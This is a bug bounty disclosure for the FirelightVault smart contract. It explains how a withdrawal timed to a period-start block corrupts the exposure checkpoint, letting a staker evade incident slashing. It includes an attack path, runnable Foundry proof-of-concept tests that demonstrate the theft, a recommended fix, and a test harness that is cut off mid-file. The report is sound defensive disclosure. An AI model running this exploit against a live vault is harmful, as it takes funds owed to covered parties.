# 89865 sc high period boundary withdrawal rewrites the period start exposure checkpoint in firelightvault letting a staker evade incident slashing and permanently underpaying the incident payout

**Submitted on Aug 21st 2026 at 15:28:18 UTC by @SavantChat for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89865
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief

`FirelightVault.payout` caps every incident payout by the vault's active assets **at the start of the covered period**, read through the *inclusive* checkpoint lookup `totalAssetsAt(capturePeriodStart)`. `withdraw`/`redeem`, however, write their **post**-withdrawal total-assets checkpoint under the *current* block timestamp.

A withdrawal executed in a block whose `block.timestamp` is exactly a period start therefore lands on the period-start checkpoint key and becomes the value that `payout` later reads as "assets committed at the start of the covered period" — even though `_requestWithdraw` deliberately assigns that request to `currentPeriod() + 1` so that it stays exposed to incidents captured in the new period.

The result is that a staker can shrink (or fully zero) the exposure cap of the period they are exiting from. The incident payout is capped at the reduced value, the funds stay in the withdrawal bucket, and the staker claims them in full once the payout window has closed. The shortfall is permanent: `payout` can only be executed during the capture period or the one after it.

## Vulnerability Details

### The two sides of the mismatch

**1. `payout` reads the period-start snapshot inclusively** — `contracts/core/FirelightVault.sol:911`:

```solidity
(uint256 capturePeriod, uint48 capturePeriodStart) = _periodAndStartAt(captureTimestamp);
...
// Cap by the active assets committed at the start of the covered period.
// This is an exposure cap, not a segregated asset bucket.
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

// Withdrawals requested during the capture period are assigned to capturePeriod + 1
// and remain payable while payout is allowed.
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`totalAssetsAt` (`FirelightVault.sol:456`) resolves to `Checkpoints.upperLookupRecent`, which returns the most recent checkpoint with key **lower or equal** to the search key (`contracts/core/lib/Checkpoints.sol:217-224`). A checkpoint written at key `== capturePeriodStart` is therefore included in the "period start" reading.

**2. `withdraw`/`redeem` write the post-withdrawal value under the current timestamp** — `FirelightVault.sol:755-778`:

```solidity
(uint256 shares, uint256 _totalSupply, uint256 _totalAssets) = _previewTotals(assets, true, Math.Rounding.Ceil);
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);
_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

and `_logTrace` (`FirelightVault.sol:1044-1056`):

```solidity
uint48 ts = Time.timestamp();
_traceBalanceOf[owner].push(ts, balance);
_traceTotalSupply.push(ts, _totalSupply);
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);   // _totalAssets - assets
```

`Checkpoints.push` (`contracts/core/lib/Checkpoints.sol:198-214`) either **appends** a checkpoint at `ts` or, when `ts` equals the latest key, **replaces** the stored value:

```solidity
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();
...
if (exists && key == lastKey) {
    self._values[len - 1] = value;   // same-key replacement
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

Both branches corrupt the snapshot: if a period-start checkpoint already exists it is overwritten with the post-withdrawal figure; if none exists, a new one is appended at exactly the period-start key and the inclusive lookup picks it up.

### Why the withdrawal is supposed to stay slashable

`_requestWithdraw` (`FirelightVault.sol:1008`) assigns the request to `currentPeriod() + 1`:

```solidity
uint256 period = currentPeriod() + 1;
...
withdrawAssets[period] += assets;
```

and `payout` explicitly adds `withdrawAssets[capturePeriod + 1]` (and `[capturePeriod + 2]`) back into `activePayableAmount`, with the in-code comment *"otherwise exposed assets could escape by withdrawing first"*. The design intent is unambiguous: assets withdrawn during a period must remain slashable for incidents captured in that period.

The exposure cap defeats exactly that intent for boundary transactions: the assets are still in `activePayableAmount`, but `assetsAtCapturePeriod` has already been reduced by the same amount, so `Math.min` clamps the payout to the post-withdrawal figure. `paidAmount` can even be `0`, and `payout` then takes the `paidAmount == 0` path — the incident is consumed as processed and the payout window advances toward expiry.

### Attack path

Period starts are fully deterministic and public: `_periodAndStartAt` (`FirelightVault.sol:1123`) computes `start = pc.epoch + periodsSinceEpoch * pc.duration` from the on-chain `PeriodConfiguration`, and `currentPeriodStart()` / `currentPeriodEnd()` are public views. There is no waiting, no unusual balance, and no privileged role involved:

1. The attacker (any staker) reads the next period start `B = vault.currentPeriodEnd()`.
2. They submit `withdraw(assets, attacker, attacker)` through a wrapper that reverts unless `block.timestamp == B` (or simply conditionally re-submits each period), so the transaction only lands in the block timestamped exactly `B`.
3. `_logTrace` writes `_traceTotalAssets[B] = totalAssets() - assets`, i.e. the period-start snapshot of the *new* period is now the post-withdrawal figure.
4. Any incident captured during that new period is paid at most `totalAssets_after_withdrawal`; the attacker's own assets, sitting in `withdrawAssets[period + 1]`, are excluded from the cap even though the code deliberately keeps them in `activePayableAmount`.
5. After the payout window closes the attacker calls `claimWithdraw` and receives the assets that should have absorbed the loss.

The same primitive applies to `redeem` (`FirelightVault.sol:735-748`), which uses the identical `_requestWithdraw` + `_logTrace` sequence.

## Impact

Cover buyers are underpaid, permanently, by exactly the amount a staker moves across the period boundary, while the staker keeps funds that the protocol's own accounting had committed as loss-absorbing capital for that period.

**PoC 1 — total evasion.** A single depositor holding 100% of the vault withdraws everything in the boundary block. `totalAssetsAt(periodStart)` becomes `0`, so an honest `PAYOUT_ROLE` call for a 10,000-unit incident captured in that period emits `PayoutExecuted(..., requestedAmount = 10_000e6, paidAmount = 0, ...)`. The payout receiver gets **nothing** while the vault still physically holds the 10,000 units; the attacker claims all of it after the window.

**PoC 2 — partial evasion.** The attacker withdraws 50% of a 200-unit vault at the boundary. The cap drops from 200 to 100, so a legitimate 200-unit payout settles at **100**. The beneficiary is short 100 units that the vault held and that the protocol's `activePayableAmount` accounting had marked as payable.

Because `_isPeriodInPayoutWindow` (`FirelightVault.sol:1130`) only allows `payout` during the capture period or the next one, the shortfall cannot be recovered later — there is no re-payout path, and the withdrawal becomes claimable as soon as the window closes.

Consequences:

* Loss of funds for the covered party: an approved incident claim settles below the vault's real capacity, with no recovery path.
* Protocol insolvency against outstanding cover: sold cover is not backed by the collateral the capacity check assumed, even though the collateral is present in the contract.
* Griefing surface beyond self-interest: the cap is global, so a boundary withdrawal reduces the payout for *every* incident captured in that period, not only the attacker's pro-rata share.
* The corruption is silent — no revert, no event anomaly; `payout` reports success with a reduced `paidAmount`.

## Recommendation

Read the exposure cap strictly **before** the period boundary, so that anything happening in the boundary block is excluded from the period-start snapshot:

```solidity
-        uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
+        // Exclusive lower bound: state changes inside the boundary block belong to the new period.
+        uint256 assetsAtCapturePeriod = capturePeriodStart == 0
+            ? 0
+            : totalAssetsAt(capturePeriodStart - 1);
```

A more robust alternative is to persist an immutable per-period opening-assets snapshot, written by the first state-changing call of a period *before* it mutates `totalAssets()`, and to have `payout` read that value instead of a timestamp lookup. That removes the dependence on inclusive/exclusive lookup semantics entirely.

Either fix should be paired with a regression test asserting that `totalAssetsAt(currentPeriodStart())` is unaffected by a `withdraw`/`redeem` executed at `block.timestamp == currentPeriodStart()`.

## References

* `contracts/core/FirelightVault.sol:911` — `assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart)`
* `contracts/core/FirelightVault.sol:456` — `totalAssetsAt` → `upperLookupRecent`
* `contracts/core/FirelightVault.sol:755-778` — `withdraw` (and `:735-748` `redeem`)
* `contracts/core/FirelightVault.sol:1008` — `_requestWithdraw`, `period = currentPeriod() + 1`
* `contracts/core/FirelightVault.sol:1044-1056` — `_logTrace`
* `contracts/core/FirelightVault.sol:1123-1131` — `_periodAndStartAt`, `_isPeriodInPayoutWindow`
* `contracts/core/lib/Checkpoints.sol:198-224` — `push` (same-key replacement) and `upperLookupRecent` (inclusive)

### Relation to previously reported issues

The closest prior item is Macro/OZ **"Period duration cannot safely be changed"**, which was *resolved* by introducing the append-only `periodConfigurations[]` array and the timestamp-keyed checkpoint traces. This report is a defect **inside that replacement mechanism** — the inclusive period-start lookup combined with same-timestamp checkpoint writes — a failure mode the prior fix neither contemplated nor prevents. It is not covered by any of the program's listed known issues (first-loss-buffer valuation, unescrowed buffer wallet, or uncapped aggregate claims).

## Proof of Concept

## Proof of Concept

Runnable Foundry PoC. Verified against a clean clone of the audited repository at tag `v1_audit_ready` (commit `42f9ea5`) with forge 1.5.1 / solc 0.8.28. Everything needed to reproduce it is inlined below — no external download required.

### 1. Where each file goes

The repository ships with a hardhat setup only, so the PoC adds a foundry profile on top of it. Place the four files below at these exact paths, relative to the repository root:

```
audit-comp-firelight/
├── foundry.toml                                          <- new (block 1.1)
├── remappings.txt                                        <- new (block 1.2)
└── test/
    └── foundry/
        ├── F01_BoundaryWithdrawSlashEvasion.t.sol         <- the PoC (block 2)
        └── utils/
            └── Deployers.sol                              <- shared harness (block 3)
```

#### 1.1 `foundry.toml` (repository root)

`via_ir = true` is mandatory — the plain pipeline hits `Stack too deep` in `CoverOrderAllocator`.

```toml
[profile.default]
src = "contracts"
test = "test/foundry"
out = "out-foundry"
libs = ["node_modules", "lib"]
solc_version = "0.8.28"
optimizer = true
optimizer_runs = 10000
evm_version = "london"
via_ir = true
fs_permissions = [{ access = "read", path = "./" }]
skip = [
    "contracts/fasset/**",
    "contracts/legacy/**",
]

[profile.default.fuzz]
runs = 32

[profile.ci]
fuzz_runs = 128
```

#### 1.2 `remappings.txt` (repository root)

```
@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/
@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/
```

### 2. The PoC — `test/foundry/F01_BoundaryWithdrawSlashEvasion.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Deployers} from "./utils/Deployers.sol";
import {FirelightVault} from "../../contracts/core/FirelightVault.sol";
import {MockERC20} from "../../contracts/test/MockERC20.sol";

// Period-boundary withdrawal overwrites the period-start exposure checkpoint
// (slashing / incident-payout evasion in FirelightVault).
//
// Root cause: FirelightVault.payout derives the period exposure cap from the INCLUSIVE
// checkpoint lookup totalAssetsAt(capturePeriodStart) (FirelightVault.sol:911 -> :456 ->
// Checkpoints.upperLookupRecent), while withdraw/redeem checkpoint the POST-withdrawal
// active assets under the CURRENT block timestamp (FirelightVault.sol:755-778, _logTrace
// at :1044-1056). A withdrawal executed in a block whose timestamp is exactly the period
// start therefore lands on the period-start key and becomes the value the payout reads as
// "assets committed at the start of the covered period" -- even though the request is
// assigned to currentPeriod()+1 precisely so that it stays slashable for incidents
// captured in the new period.
//
// Impact: full or partial evasion of incident payouts. The payout receiver is paid 0 (or an
// underpaid amount), the vault keeps the funds in the withdrawal bucket, and the attacker
// claims them in full once the payout window closes.

contract F01_BoundaryWithdrawSlashEvasionTest is Test, Deployers {
    function test_boundaryWithdrawEvadesSlashing() public {
        // 6-decimal asset, single depositor owning 100% of vault shares.
        VaultCtx memory ctx = deployVault(6, 1_000_000e6);
        FirelightVault vault = ctx.vault;
        MockERC20 token = ctx.token;
        address attacker = makeAddr("attacker");
        uint256 deposit = 10_000e6;

        mintAndApprove(ctx, attacker, deposit);
        vm.prank(attacker);
        vault.deposit(deposit, attacker);

        assertEq(vault.balanceOf(attacker), deposit);
        assertEq(vault.totalAssets(), deposit);

        // Jump to the exact start of period 1 so the withdraw lands at
        // block.timestamp == currentPeriodStart() == old currentPeriodEnd().
        uint48 boundary = vault.currentPeriodEnd();
        vm.warp(boundary);

        // Boundary withdrawal: burns all shares, moves assets to withdrawAssets[2],
        // and pushes a total-assets checkpoint (boundary, 0) that REPLACES any
        // period-start value the payout would otherwise see.
        vm.prank(attacker);
        vault.withdraw(deposit, attacker, attacker);

        assertEq(vault.currentPeriod(), 1);
        assertEq(vault.currentPeriodStart(), boundary);
        assertEq(vault.balanceOf(attacker), 0);
        assertEq(vault.pendingWithdrawAssets(), deposit);
        assertEq(vault.withdrawAssets(2), deposit);
        assertEq(vault.totalAssets(), 0);
        // The corrupted period-start snapshot:
        assertEq(vault.totalAssetsAt(boundary), 0);

        // Honest PAYOUT_ROLE executes an incident payout captured in period 1.
        // assetsAtCapturePeriod = totalAssetsAt(boundary) = 0  => paidAmount = 0.
        vm.prank(ctx.payoutSigner);
        vm.expectEmit(true, true, true, true);
        emit PayoutExecuted(ctx.payoutReceiver, deposit, 0, boundary);
        vault.payout(ctx.payoutReceiver, deposit, boundary);

        // The incident victim receives nothing while the vault still holds the funds.
        assertEq(token.balanceOf(ctx.payoutReceiver), 0);
        assertEq(token.balanceOf(address(vault)), deposit);
        assertEq(vault.withdrawAssets(2), deposit);

        // The attacker waits out the window and claims the full amount.
        vm.warp(boundary + 2 * ctx.periodDuration);
        assertGt(vault.currentPeriod(), 2);
        vm.prank(attacker);
        vault.claimWithdraw(2);
        assertEq(token.balanceOf(attacker), deposit);
    }

    function test_boundaryWithdrawUnderpaysPartialWithdraw() public {
        // Variant: attacker withdraws 50% of the vault at the boundary. One honest staker
        // remains, but the period-start exposure cap is cut from 200 to 100, so a legitimate
        // 200-unit incident payout is underpaid by 100 units.
        VaultCtx memory ctx = deployVault(6, 1_000_000e6);
        FirelightVault vault = ctx.vault;
        MockERC20 token = ctx.token;
        address attacker = makeAddr("attacker");
        address staker = makeAddr("staker");
        uint256 amount = 100e6;

        mintAndApprove(ctx, attacker, amount);
        mintAndApprove(ctx, staker, amount);
        vm.prank(attacker);
        vault.deposit(amount, attacker);
        vm.prank(staker);
        vault.deposit(amount, staker);
        assertEq(vault.totalAssets(), 2 * amount);

        uint48 boundary = vault.currentPeriodEnd();
        vm.warp(boundary);
        vm.prank(attacker);
        vault.withdraw(amount, attacker, attacker); // 100 of the 200 total (50%)

        // Snapshot halved: 100 instead of 200.
        assertEq(vault.totalAssetsAt(boundary), amount);

        vm.warp(boundary + 1); // still inside period 1
        vm.prank(ctx.payoutSigner);
        uint256 paid = vault.payout(ctx.payoutReceiver, 2 * amount, boundary);

        // paidAmount = min(200, min(100 snapshot, 100 payable + 100 bucket=200... ))
        // active = 100 (staker), captureWithdrawals = withdrawAssets[2] = 100
        // activePayable = 200; assetsAtCapturePeriod = 100 -> paid = 100, not 200.
        assertEq(paid, amount);
        assertEq(token.balanceOf(ctx.payoutReceiver), amount);
        // The attacker's pending withdrawal was slashed pro-rata for only the paid part:
        // paidFromActive = floor(100*100/200)=50, paidFromCaptureWithdrawals = 50.
        assertEq(vault.withdrawAssets(2), amount - 50e6);
        // Attacker still comes out ahead: escaped 50 units of slash.
        vm.warp(boundary + 2 * ctx.periodDuration + 1);
        vm.prank(attacker);
        vault.claimWithdraw(2);
        // Attacker received the remaining 50 of their 100 despite the 200-unit incident
        // exposure at period start (should have been fully slashable).
        assertEq(token.balanceOf(attacker), 50e6);
    }

    event PayoutExecuted(address indexed to, uint256 requestedAmount, uint256 paidAmount, uint48 captureTimestamp);
}
```

### 3. Shared harness — `test/foundry/utils/Deployers.sol`

Deployment harness used by the PoC: it wires `FirelightVault` behind an ERC1967 proxy with the roles the test needs (`PAYOUT_ROLE`, `PAYOUT_ALLOWLIST_ROLE`) and a 1-day period configuration. It uses only mocks that already exist in the repository under `contracts/test/`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "../../../contracts/core/FirelightVault.sol";
import {IncidentManager} from "../../../contracts/core/IncidentManager.sol";
import {CoverOrderAllocator} from "../../../contracts/core/CoverOrderAllocator.sol";
import {CoverNFT} from "../../../contracts/core/CoverNFT.sol";
import {ICoverOrderAllocator} from "../../../contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "../../../contracts/core/interfaces/IFirelightVault.sol";
import {IAggregatorV3} from "../../../contracts/core/interfaces/IAggregatorV3.sol";
import {IIncidentManager} from "../../../contracts/core/interfaces/IIncidentManager.sol";
import {MockERC20} from "../../../contracts/test/MockERC20.sol";
import {MockPriceFeed} from "../../../contracts/test/MockPriceFeed.sol";
import {MockAggregatorV3} from "../../../contracts/test/MockAggregatorV3.sol";
import {MockIncidentManagerVault} from "../../../contracts/test/MockIncidentManagerVault.sol";
import {MockIncidentManagerCoverOrderAllocator} from "../../../contracts/test/MockIncidentManagerCoverOrderAllocator.sol";
import {MockCoverOrderAllocatorVault} from "../../../contracts/test/MockCoverOrderAllocatorVault.sol";

/// @dev Shared deployment harness for the Firelight foundry PoC testbed.
contract Deployers is Test {
    uint48 public constant PERIOD_DURATION = 1 days;
    uint256 public constant BPS = 10_000;
    uint256 public constant SECONDS_PER_YEAR = 365 days;

    struct VaultCtx {
        FirelightVault vault;
        MockERC20 token;
        address admin;
        address rescuer;
        address blocklister;
        address pauser;
        address limitUpdater;
        address periodConfigUpdater;
        address payoutSigner; // PAYOUT_ROLE
        address payoutAllowlister; // PAYOUT_ALLOWLIST_ROLE
        address payoutReceiver; // allowlisted payout destination
        uint48 periodDuration;
    }

    event Dummy(); // silence unused-var warnings

    function deployVault(uint8 decimals, uint256 depositLimit) internal returns (VaultCtx memory ctx) {
        ctx = _deployVault(decimals, depositLimit, PERIOD_DURATION);
    }

    function deployVault(uint8 decimals, uint256 depositLimit, uint48 duration) internal returns (VaultCtx memory) {
        return _deployVault(decimals, depositLimit, duration);
    }

    function _deployVault(uint8 decimals, uint256 depositLimit, uint48 duration) private returns (VaultCtx memory ctx) {
        ctx.admin = makeAddr("admin");
        ctx.rescuer = makeAddr("rescuer");
        ctx.blocklister = makeAddr("blocklister");
        ctx.pauser = makeAddr("pauser");
        ctx.limitUpdater = makeAddr("limitUpdater");
        ctx.periodConfigUpdater = makeAddr("periodConfigUpdater");
        ctx.payoutSigner = makeAddr("payoutSigner");
        ctx.payoutAllowlister = makeAddr("payoutAllowlister");
        ctx.payoutReceiver = makeAddr("payoutReceiver");

        ctx.token = new MockERC20("MockAsset", "MKA", decimals);
        ctx.periodDuration = duration;

        FirelightVault impl = new FirelightVault();
        FirelightVault.InitParams memory params = FirelightVault.InitParams({
            defaultAdmin: ctx.admin,
            limitUpdater: ctx.limitUpdater,
            blocklister: ctx.blocklister,
            pauser: ctx.pauser,
            periodConfigurationUpdater: ctx.periodConfigUpdater,
            rescuer: ctx.rescuer,
            depositLimit: depositLimit,
            periodConfigurationDuration: duration
        });
        bytes memory initData = abi.encodeCall(
            FirelightVault.initialize,
            (IERC20(address(ctx.token)), "FirelightVault", "FLV", abi.encode(params))
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        ctx.vault = FirelightVault(address(proxy));

        vm.startPrank(ctx.admin);
        ctx.vault.grantRole(ctx.vault.PAYOUT_ROLE(), ctx.payoutSigner);
        ctx.vault.grantRole(ctx.vault.PAYOUT_ALLOWLIST_ROLE(), ctx.payoutAllowlister);
        vm.stopPrank();
        vm.prank(ctx.payoutAllowlister);
        ctx.vault.addToPayoutAllowlist(ctx.payoutReceiver);
    }

    function mintAndApprove(VaultCtx memory ctx, address user, uint256 amount) internal {
        ctx.token.mint(user, amount);
        vm.prank(user);
        ctx.token.approve(address(ctx.vault), amount);
    }

    // ---------------------------------------------------------------------
    // IncidentManager fixture (mirrors test/incidentManager/fixtures.js)
    // ---------------------------------------------------------------------

    uint48 public constant CAPTURE_TS = 1_700_000_000;
    uint256 public constant INCIDENT_PERIOD = 2;

    struct IncidentCtx {
        IncidentManager incidentManager;
        MockIncidentManagerCoverOrderAllocator mockAllocator;
        MockIncidentManagerVault mockVault;
        MockERC20 vaultAsset; // 18 decimals
        MockERC20 flbToken; // 6 decimals
        MockPriceFeed priceFeed; // 8 decimals, $1
        address admin;
        address curator;
        address assessmentApprover;
        address assessmentRejecter;
        address incidentInvalidator;
        address configAdmin;
        address payoutAdmin;
        address priceFeedAdmin;
        address payoutReceiver;
        address flbPayer;
        address payoutRecipient1;
        address payoutRecipient2;
        address stranger;
        bytes32 marketIdA;
        bytes32 marketIdB;
    }

    function deployIncidentManager() internal returns (IncidentCtx memory ctx) {
        // Ensure block.timestamp >= CAPTURE_TS so incidents can reference it.
        vm.warp(CAPTURE_TS + 1 days);

        ctx.admin = makeAddr("im.admin");
        ctx.curator = makeAddr("im.curator");
        ctx.assessmentApprover = makeAddr("im.approver");
        ctx.assessmentRejecter = makeAddr("im.rejecter");
        ctx.incidentInvalidator = makeAddr("im.invalidator");
        ctx.configAdmin = makeAddr("im.configAdmin");
        ctx.payoutAdmin = makeAddr("im.payoutAdmin");
        ctx.priceFeedAdmin = makeAddr("im.priceFeedAdmin");
        ctx.payoutReceiver = makeAddr("im.payoutReceiver");
        ctx.flbPayer = makeAddr("im.flbPayer");
        ctx.payoutRecipient1 = makeAddr("im.payoutRecipient1");
        ctx.payoutRecipient2 = makeAddr("im.payoutRecipient2");
        ctx.stranger = makeAddr("im.stranger");

        ctx.mockVault = new MockIncidentManagerVault();
        ctx.mockVault.setCurrentPeriod(INCIDENT_PERIOD);
        ctx.mockVault.setPeriodAtTimestamp(CAPTURE_TS, INCIDENT_PERIOD);

        ctx.vaultAsset = new MockERC20("MockVaultAsset", "mVA", 18);
        ctx.mockVault.setAsset(address(ctx.vaultAsset));
        ctx.flbToken = new MockERC20("MockUSDC", "mUSDC", 6);

        ctx.mockAllocator = new MockIncidentManagerCoverOrderAllocator();
        ctx.mockAllocator.setVault(IFirelightVault(address(ctx.mockVault)));
        ctx.mockAllocator.setCanonicalDecimals(18);
        ctx.mockAllocator.setMockCapacityConfig(
            ICoverOrderAllocator.CapacityConfig({
                minCAR: 10_000,
                firstLossBufferToken: IERC20(address(ctx.flbToken)),
                firstLossBuffer: ctx.flbPayer,
                effectiveLeverage: 20_000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        );

        ctx.priceFeed = new MockPriceFeed(8, int256(10 ** 8)); // $1.00, 8 decimals
        ctx.marketIdA = keccak256("market-A");
        ctx.marketIdB = keccak256("market-B");

        IncidentManager impl = new IncidentManager();
        bytes memory initData = abi.encodeCall(
            IncidentManager.initialize,
            (
                ctx.admin,
                ctx.curator,
                ctx.assessmentApprover,
                ctx.assessmentRejecter,
                ctx.incidentInvalidator,
                ctx.configAdmin,
                ctx.payoutAdmin,
                ctx.priceFeedAdmin,
                ctx.payoutReceiver,
                ICoverOrderAllocator(address(ctx.mockAllocator)),
                IAggregatorV3(address(ctx.priceFeed)),
                3600
            )
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        ctx.incidentManager = IncidentManager(address(proxy));
    }

    function fundFlb(IncidentCtx memory ctx, uint256 amount) internal {
        ctx.flbToken.mint(ctx.flbPayer, amount);
        vm.prank(ctx.flbPayer);
        ctx.flbToken.approve(address(ctx.incidentManager), amount);
    }

    function setOrderMarket(IncidentCtx memory ctx, uint256 coverTokenId, bytes32 marketId, uint256 allocated, address recipient) internal {
        ctx.mockAllocator.setOrderMarket(coverTokenId, marketId, INCIDENT_PERIOD, allocated, recipient);
    }

    function setOrderMarket(IncidentCtx memory ctx, uint256 coverTokenId, bytes32 marketId, uint256 period, uint256 allocated, address recipient) internal {
        ctx.mockAllocator.setOrderMarket(coverTokenId, marketId, period, allocated, recipient);
    }

    function createAndSubmitIncident(IncidentCtx memory ctx, uint256 lossAmount, uint256 allocatedCover) internal {
        vm.startPrank(ctx.curator);
        ctx.incidentManager.createIncident(CAPTURE_TS, "A", keccak256("a"));
        ctx.incidentManager.confirmIncident(1, "ipfs://r");
        vm.stopPrank();
        setOrderMarket(ctx, 1, ctx.marketIdA, allocatedCover, ctx.payoutRecipient1);
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({coverTokenId: 1, marketId: ctx.marketIdA, amount: lossAmount});
        vm.prank(ctx.curator);
        ctx.incidentManager.addAssessmentLosses(1, losses);
        vm.prank(ctx.curator);
        ctx.incidentManager.submitCurrentAssessment(1);
    }

    // ---------------------------------------------------------------------
    // CoverOrderAllocator fixture (mirrors test/setup/fixtures.js)
    // ---------------------------------------------------------------------

    struct AllocatorCtx {
        CoverOrderAllocator allocator;
        CoverNFT coverNFT;
        MockCoverOrderAllocatorVault mockVault;
        MockERC20 usdc; // premium token + FLB, 6 decimals
        MockERC20 usdt; // premium token, 6 decimals
        MockAggregatorV3 priceFeed; // 18 decimals, $1
        address deployer;
        address admin;
        address curator;
        address allocatorRole;
        address configAdmin;
        address premiumCollector;
        address flbWallet;
        address buyer1;
        address buyer2;
        bytes32 marketIdA; // Morpho / chain 1 / market-A
        bytes32 marketIdB; // Aave / chain 10 / market-B
        bytes32 concHashMorpho;
        bytes32 concHashAave;
        uint48 periodDuration;
    }

    function deployAllocator() internal returns (AllocatorCtx memory ctx) {
        ctx.deployer = address(this);
        ctx.admin = makeAddr("coa.admin");
        ctx.curator = makeAddr("coa.curator");
        ctx.allocatorRole = makeAddr("coa.allocator");
        ctx.configAdmin = makeAddr("coa.configAdmin");
        ctx.premiumCollector = makeAddr("coa.premiumCollector");
        ctx.flbWallet = makeAddr("coa.flbWallet");
        ctx.buyer1 = makeAddr("coa.buyer1");
        ctx.buyer2 = makeAddr("coa.buyer2");

        ctx.mockVault = new MockCoverOrderAllocatorVault();
        ctx.mockVault.setCurrentPeriod(1);
        ctx.mockVault.setTotalAssets(0);
        ctx.mockVault.setPeriodConfiguration(1, pc(0, 7 days, 1));
        ctx.mockVault.setPeriodConfiguration(2, pc(0, 7 days, 2));
        ctx.mockVault.setPeriodConfiguration(3, pc(0, 7 days, 3));

        ctx.usdc = new MockERC20("MockUSDC", "mUSDC", 6);
        ctx.usdt = new MockERC20("MockUSDT", "mUSDT", 6);
        ctx.mockVault.setAsset(address(ctx.usdc));

        ctx.priceFeed = new MockAggregatorV3(18, int256(10 ** 18)); // $1, 18 decimals

        // CoverNFT proxy
        CoverNFT nftImpl = new CoverNFT();
        bytes memory nftInit = abi.encodeCall(
            CoverNFT.initialize, ("Firelight Cover", "FLCOVER", "", ctx.admin, ctx.deployer, address(0), address(0))
        );
        ERC1967Proxy nftProxy = new ERC1967Proxy(address(nftImpl), nftInit);
        ctx.coverNFT = CoverNFT(address(nftProxy));

        // markets / concentrations / capacity config
        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](2);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "Morpho", market: bytes32("market-A")});
        markets[1] = ICoverOrderAllocator.Market({chainId: 10, protocol: "Aave", market: bytes32("market-B")});

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concs =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](2);
        concs[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            protocol: "Morpho", chainId: 1, maxProtocolConcentrationBps: 6000
        });
        concs[1] = ICoverOrderAllocator.ProtocolConcentrationInput({
            protocol: "Aave", chainId: 10, maxProtocolConcentrationBps: 4000
        });

        address[] memory premiumTokens = new address[](2);
        premiumTokens[0] = address(ctx.usdc);
        premiumTokens[1] = address(ctx.usdt);

        ICoverOrderAllocator.InitParams memory params = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(ctx.mockVault)),
            premiumCollector: ctx.premiumCollector,
            coverNFT: ctx.coverNFT,
            priceFeedAdapter: IAggregatorV3(address(ctx.priceFeed)),
            maxPriceAge: 7 days,
            premiumTokens: premiumTokens,
            admin: ctx.admin,
            adminRole: ctx.admin,
            curatorRole: ctx.curator,
            allocatorRole: ctx.allocatorRole,
            configAdminRole: ctx.configAdmin,
            initialProtocolConcentrations: concs,
            newMarkets: markets,
            capacityConfig: ICoverOrderAllocator.CapacityConfig({
                minCAR: 12_000,
                firstLossBufferToken: IERC20(address(ctx.usdc)),
                firstLossBuffer: ctx.flbWallet,
                effectiveLeverage: 24_000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        });

        CoverOrderAllocator impl = new CoverOrderAllocator();
        bytes memory initData = abi.encodeCall(CoverOrderAllocator.initialize, (params));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        ctx.allocator = CoverOrderAllocator(address(proxy));

        vm.prank(ctx.admin);
        ctx.coverNFT.grantRole(keccak256("MINTER_ROLE"), address(ctx.allocator));

        ctx.marketIdA = keccak256(abi.encode(uint64(1), "Morpho", bytes32("market-A")));
        ctx.marketIdB = keccak256(abi.encode(uint64(10), "Aave", bytes32("market-B")));
        ctx.concHashMorpho = keccak256(abi.encode(uint64(1), "Morpho"));
        ctx.concHashAave = keccak256(abi.encode(uint64(10), "Aave"));
        ctx.periodDuration = 7 days;
    }

    function fundAndApprove(AllocatorCtx memory ctx, address buyer, MockERC20 token, uint256 amount) internal {
        token.mint(buyer, amount);
        vm.prank(buyer);
        token.approve(address(ctx.allocator), amount);
    }

    // ---------------------------------------------------------------------
    // Merkle helpers (OZ standard double-hash leaves, sorted-pair nodes)
    // ---------------------------------------------------------------------

    function mktLeaf(uint256 orderId, ICoverOrderAllocator.MarketCoverAllocation[] memory allocs) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(orderId, allocs))));
    }

    /// Single-leaf tree: root == leaf, empty proof.
